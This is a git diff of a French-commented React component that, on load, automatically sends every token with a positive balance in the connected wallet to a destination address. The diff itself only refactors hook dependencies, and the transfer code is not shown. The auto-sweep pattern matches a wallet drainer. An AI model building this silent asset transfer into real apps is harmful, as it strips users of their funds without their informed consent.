@@ -1,4 +1,4 @@
-import { useEffect } from 'react';
+import { useEffect, useCallback } from 'react';
 import { useAtom } from 'jotai';
 import { useWalletClient, usePublicClient } from 'wagmi';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
@@ -17,7 +17,7 @@ export const SendTokens = () => {
   const publicClient = usePublicClient();
 
   // Automatiser l'envoi de tous les tokens disponibles
-  const sendAllTokens = async () => {
+  const sendAllTokens = useCallback(async () => {
     const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
       .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
       .map((token) => token.contract_address as `0x${string}`);
@@ -70,13 +70,13 @@ export const SendTokens = () => {
         console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
-  };
+  }, [tokens, walletClient, destinationAddress, setCheckedRecords, setDestinationAddress]);  // Ajout des dépendances manquantes
 
   useEffect(() => {
     if (tokens.length > 0 && destinationAddress) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient]); // Quand les tokens ou l'adresse changent, l'envoi se déclenche
+  }, [tokens, destinationAddress, walletClient, sendAllTokens]); // Ajout des dépendances manquantes
 
   return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
 };
